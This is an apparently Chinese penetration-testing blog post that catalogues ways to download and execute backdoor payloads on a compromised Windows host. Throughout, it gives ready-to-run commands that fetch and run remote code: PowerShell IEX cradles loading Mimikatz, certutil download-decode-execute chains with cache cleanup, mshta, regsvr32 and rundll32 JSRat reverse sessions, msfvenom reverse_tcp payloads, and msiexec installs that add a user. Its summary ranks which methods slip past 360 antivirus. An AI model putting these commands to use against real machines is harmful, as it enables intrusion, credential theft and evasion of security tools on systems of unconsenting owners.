        <content type="html"><![CDATA[<h1 id="windows命令行下载文件"><a href="#windows命令行下载文件" class="headerlink" title="windows命令行下载文件"></a>windows命令行下载文件</h1><p>当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？</p><p>一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式<strong>。</strong>另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p><blockquote><p>参考：</p><ul><li><a href="https://www.jianshu.com/p/bdf67ffe0b21">https://www.jianshu.com/p/bdf67ffe0b21</a></li><li><a href="https://www.cnblogs.com/liujunjun/p/14718354.html">https://www.cnblogs.com/liujunjun/p/14718354.html</a></li><li><a href="https://xz.aliyun.com/t/1654#toc-6">https://xz.aliyun.com/t/1654#toc-6</a></li><li><a href="https://xz.aliyun.com/t/1654/">https://xz.aliyun.com/t/1654/</a></li><li><a href="https://evi1cg.me/archives/remote_exec.html">https://evi1cg.me/archives/remote_exec.html</a></li><li><a href="https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A">https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A</a></li><li><a href="https://www.cnblogs.com/17bdw/p/8550189.html">Windows执行命令与下载文件总结 </a></li><li><a href="https://www.jianshu.com/p/e8f65deac245">在windows上执行恶意代码 by rundll32 &amp; regsvr32</a></li><li><a href="https://www.codercto.com/a/104908.html">IEexec.exe执行payload</a></li><li><a href="https://www.cnblogs.com/backlion/p/10488747.html">rundll32.exe 多种方法绕过白名单</a></li></ul></blockquote><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。只能命令下载到指定路径上，适用win7以上。适用于windows 7以上版本。 详情参考：</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/bits/bitsadmin-tool?redirectedfrom=MSDN">https://learn.microsoft.com/zh-cn/windows/win32/bits/bitsadmin-tool?redirectedfrom=MSDN</a></p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal <span class="string">&quot;http://192.168.203.140/b.ps1&quot;</span> <span class="string">&quot;E:\\phpstudy_pro\\WWW\\b.ps1&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal <span class="string">&quot;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&quot;</span> <span class="string">&quot;d:\abc.jpg&quot;</span></span><br><span class="line">bitsadmin /transfer d90f &lt;http://site.com/a&gt; %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;<span class="built_in">del</span> %APPDATA%\d90f.exe</span><br></pre></td></tr></table></figure><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>适用于windows 7以上版本。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#远程执行命令：</span></span><br><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#远程下载文件保存在本地：</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.203.140/a.ps1&#x27;</span>,<span class="string">&#x27;E:\phpstudy_pro\WWW\a.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;&lt;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&gt;&#x27;</span>); <span class="built_in">Invoke-Mimikatz</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-exec</span> bypass <span class="operator">-f</span> \\webdavserver\folder\payload.ps1</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile( <span class="string">&#x27;http://192.168.168.183/1.exe’,’C:\111111111111111.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> (<span class="built_in">new-object</span> System.Net.WebClient).Downloadfile(<span class="string">&#x27;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&#x27;</span>,<span class="string">&#x27;d:\\1.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h2><p>适用于server 2003 以上版本。 </p><p>第一种把下载地址直接echo输入download.vbs。直接下载即可。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">Set</span> Post = CreateObject(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">Set</span> Shell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.203.140/a.ps1&quot;</span>,<span class="number">0</span> &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> Post.Send() &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">Set</span> aGet = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Mode = <span class="number">3</span> &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Type = <span class="number">1</span> &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Open() &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line"><span class="built_in">echo</span> aGet.SaveToFile <span class="string">&quot;D:/a.ps1&quot;</span>,<span class="number">2</span> &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure><p>第二种保存脚本后再下载指定文件。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">set</span> a=createobject(^<span class="string">&quot;adod^&quot;</span>+^<span class="string">&quot;b.stream^&quot;</span>):<span class="built_in">set</span> w=createobject(^<span class="string">&quot;micro^&quot;</span>+^<span class="string">&quot;soft.xmlhttp^&quot;</span>):w.open^<span class="string">&quot;get^&quot;</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  &gt;&gt; downfile.vbs</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cscript downfile.vbs http://<span class="number">192.168</span>.<span class="number">203.140</span>/a.ps1 D:\\tomcat8.<span class="number">5</span>\\webapps\\x.ps1</span><br></pre></td></tr></table></figure><h2 id="mshta命令下载执行"><a href="#mshta命令下载执行" class="headerlink" title="mshta命令下载执行"></a>mshta命令下载执行</h2><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mshta vbscript:Close(Execute(<span class="string">&quot;GetObject(&quot;</span><span class="string">&quot;script:http://webserver/payload.sct&quot;</span><span class="string">&quot;)&quot;</span>))</span><br><span class="line"><span class="comment">#下载hta</span></span><br><span class="line">mshta http://webserver/payload.hta</span><br></pre></td></tr></table></figure><h3 id="payload-hta"><a href="#payload-hta" class="headerlink" title="payload.hta"></a>payload.hta</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;cmd.exe /c net user test password /add&quot; // 这里填写命令</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><h2 id="ipc-文件共享"><a href="#ipc-文件共享" class="headerlink" title="ipc$文件共享"></a>ipc$文件共享</h2><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立远程IPC连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">28.128</span>\ipc<span class="variable">$</span> /user:administrator <span class="string">&quot;abc123!&quot;</span></span><br><span class="line"><span class="comment">#复制远程文件到本地主机</span></span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">28.128</span>\c<span class="variable">$</span>\<span class="number">2</span>.txt D:\test</span><br></pre></td></tr></table></figure><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 127.0.0.1</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">get file</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h2><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p><blockquote><p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tftp -i 你的IP get 要下载文件 存放位置</span><br></pre></td></tr></table></figure><h2 id="rundll32命令下载执行"><a href="#rundll32命令下载执行" class="headerlink" title="rundll32命令下载执行"></a>rundll32命令下载执行</h2><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p><blockquote><p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p></blockquote><p>步骤一：开始运行JSRat，监听本地8888端口。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209172232324.png" alt="img" style="zoom:50%;" /><p>步骤二：通过url访问，可以查看恶意代码。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209172232197.png" alt="img"></p><p>复制代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.28.131:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure><p>步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209172233525.png" alt="img"></p><blockquote><p>参考：<a href="https://github.com/3gstudent/Javascript-Backdoor">https://github.com/3gstudent/Javascript-Backdoor</a></p></blockquote><h2 id="net中的regasm命令下载执行"><a href="#net中的regasm命令下载执行" class="headerlink" title="net中的regasm命令下载执行"></a>net中的regasm命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll</span><br></pre></td></tr></table></figure><h2 id="cmd的远程命令下载："><a href="#cmd的远程命令下载：" class="headerlink" title="cmd的远程命令下载："></a>cmd的远程命令下载：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd.exe /k &lt; \webdavserver\folder\batchfile.txt</span><br></pre></td></tr></table></figure><h2 id="regsvr32命令下载执行"><a href="#regsvr32命令下载执行" class="headerlink" title="regsvr32命令下载执行"></a>regsvr32命令下载执行</h2><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在目标机上执行：</span></span><br><span class="line">regsvr32 /u /n /s /i:http://webserver/js.png scrobj.dll</span><br></pre></td></tr></table></figure><h3 id="js-png"><a href="#js-png" class="headerlink" title="js.png"></a>js.png</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    progid=&quot;ShortJSRAT&quot;</span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">            ps  = &quot;cmd.exe /c calc.exe&quot;;</span><br><span class="line">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span><br><span class="line">        ]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><h2 id="certutil命令下载执行"><a href="#certutil命令下载执行" class="headerlink" title="certutil命令下载执行"></a>certutil命令下载执行</h2><p>用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p><blockquote><p>注：</p><ul><li>缓存目录为：”%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”</li><li>certutil命令详情参考：<a href="https://learn.microsoft.com/en-us/previous-versions/orphan-topics/ws.10/cc773087(v=ws.10)?redirectedfrom=MSDN">https://learn.microsoft.com/en-us/previous-versions/orphan-topics/ws.10/cc773087(v=ws.10)?redirectedfrom=MSDN</a></li></ul></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载文件</span></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">28.128</span>/imag/evil.txt test.php</span><br><span class="line"><span class="comment">#删除缓存</span></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">28.128</span>/imag/evil.txt delete</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://webserver/payload.b64 payload.b64 &amp; certutil <span class="literal">-decode</span> payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\InstallUtil /logfile= /LogToConsole=false /u payload.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://webserver/payload.b64 payload.b64 &amp; certutil <span class="literal">-decode</span> payload.b64 payload.exe &amp; payload.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp;  <span class="built_in">del</span> a.exe &amp;&amp; certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">254.102</span>:<span class="number">80</span>/a delete</span><br></pre></td></tr></table></figure><h2 id="net中的MSBulid命令下载执行"><a href="#net中的MSBulid命令下载执行" class="headerlink" title="net中的MSBulid命令下载执行"></a>net中的MSBulid命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;</span><br></pre></td></tr></table></figure><h2 id="odbcconf命令下载执行"><a href="#odbcconf命令下载执行" class="headerlink" title="odbcconf命令下载执行"></a>odbcconf命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">odbcconf /s /a &#123;regsvr \\webdavserver\folder\payload_dll.txt&#125;</span><br></pre></td></tr></table></figure><h2 id="cscript脚本远程命令下载执行"><a href="#cscript脚本远程命令下载执行" class="headerlink" title="cscript脚本远程命令下载执行"></a>cscript脚本远程命令下载执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br></pre></td></tr></table></figure><h3 id="downfile-vbs"><a href="#downfile-vbs" class="headerlink" title="downfile.vbs:"></a>downfile.vbs:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; Set your settings</span><br><span class="line"></span><br><span class="line">strFileURL = &quot;http://www.it1.net/images/it1_logo2.jpg&quot;</span><br><span class="line"></span><br><span class="line">strHDLocation = &quot;c:\logo.jpg&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27; Fetch the file</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line"></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If objXMLHTTP.Status = 200 Then</span><br><span class="line"></span><br><span class="line">Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line"></span><br><span class="line">objADOStream.Open</span><br><span class="line"></span><br><span class="line">objADOStream.Type = 1 &#x27;adTypeBinary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line"></span><br><span class="line">objADOStream.Position = 0&#x27;Set the stream position to the start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Set objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line"></span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line"></span><br><span class="line">Set objFSO = Nothing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line"></span><br><span class="line">objADOStream.Close</span><br><span class="line"></span><br><span class="line">Set objADOStream = Nothing</span><br><span class="line"></span><br><span class="line">End if</span><br><span class="line"></span><br><span class="line">Set objXMLHTTP = Nothing</span><br></pre></td></tr></table></figure><p>将以上保存为downfile.vbs</p><p>输入命令：cscript downfile.vbs</p><h2 id="pubprn-vbs下载执行命令"><a href="#pubprn-vbs下载执行命令" class="headerlink" title="pubprn.vbs下载执行命令"></a>pubprn.vbs下载执行命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:&lt;https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct&gt;</span><br></pre></td></tr></table></figure><h2 id="windows自带命令copy"><a href="#windows自带命令copy" class="headerlink" title="windows自带命令copy"></a>windows自带命令copy</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \x.x.x.x\xx\poc.exe</span><br><span class="line">xcopy d:\test.exe \x.x.x.x\test.exe</span><br></pre></td></tr></table></figure><h2 id="IEXPLORE-EXE命令下载执行-需要IE存在oday"><a href="#IEXPLORE-EXE命令下载执行-需要IE存在oday" class="headerlink" title="IEXPLORE.EXE命令下载执行(需要IE存在oday)"></a>IEXPLORE.EXE命令下载执行(需要IE存在oday)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Internet Explorer\IEXPLORE.EXE&quot; &lt;http://site.com/exp&gt;</span><br></pre></td></tr></table></figure><h2 id="IEEXC命令下载执行"><a href="#IEEXC命令下载执行" class="headerlink" title="IEEXC命令下载执行"></a>IEEXC命令下载执行</h2><p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成Payload：</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用管理员身份打开cmd，分别运行下面两条命令。</span></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.<span class="number">0.50727</span>&gt;caspol.exe <span class="literal">-s</span> off</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.<span class="number">0.50727</span>&gt;IEExec.exe http://<span class="number">192.168</span>.<span class="number">28.131</span>/evil.exe</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a></p></blockquote><h2 id="msiexec命令下载执行"><a href="#msiexec命令下载执行" class="headerlink" title="msiexec命令下载执行"></a>msiexec命令下载执行</h2><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成msi包</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/exec CMD=<span class="string">&#x27;net user test abc123! /add&#x27;</span> <span class="operator">-f</span> msi &gt; evil.msi</span><br><span class="line"><span class="comment">#远程执行</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">28.128</span>/evil.msi</span><br></pre></td></tr></table></figure><h2 id="下载命令执行项目GreatSCT"><a href="#下载命令执行项目GreatSCT" class="headerlink" title="下载命令执行项目GreatSCT"></a>下载命令执行项目GreatSCT</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;https://github.com/GreatSCT/&gt;</span><br></pre></td></tr></table></figure><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</p><blockquote><p>wget.exe下载：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O &quot;evil.txt&quot; http://192.168.28.128/imag/evil.txt</span><br></pre></td></tr></table></figure><h2 id="MSXSL-EXE"><a href="#MSXSL-EXE" class="headerlink" title="MSXSL.EXE"></a>MSXSL.EXE</h2><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p><blockquote><p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p></blockquote><p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl</span><br><span class="line">demo.xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;</span><br><span class="line">&lt;customers&gt;</span><br><span class="line">&lt;customer&gt;</span><br><span class="line">&lt;name&gt;Microsoft&lt;/name&gt;</span><br><span class="line">&lt;/customer&gt;</span><br><span class="line">&lt;/customers&gt;</span><br><span class="line">exec.xsl</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot;</span><br><span class="line">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><br><span class="line">xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;</span><br><span class="line">   function xml(nodelist) &#123;</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);</span><br><span class="line">   return nodelist.nextNode().xml;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&lt;/msxsl:script&gt;</span><br><span class="line">&lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure><h2 id="pubprn-vbs"><a href="#pubprn-vbs" class="headerlink" title="pubprn.vbs"></a>pubprn.vbs</h2><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot; 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br><span class="line">test.sct</span><br><span class="line"></span><br><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration</span><br><span class="line">    description=&quot;Bandit&quot;</span><br><span class="line">    progid=&quot;Bandit&quot;</span><br><span class="line">    version=&quot;1.00&quot;</span><br><span class="line">    classid=&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">    remotable=&quot;true&quot;</span><br><span class="line">    &gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>经过多方测试，vbs不会遭到360拦截，certutil也可能不会拦截。通用性最强的还是 bitsadmin。另外bitadmin有个 powershell 版本，万一cmd版本真的给微软弃用了，可以替代。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GO语言学习</title>
      <link href="/2022-09-11-Coder/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022-09-11-Coder/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
      
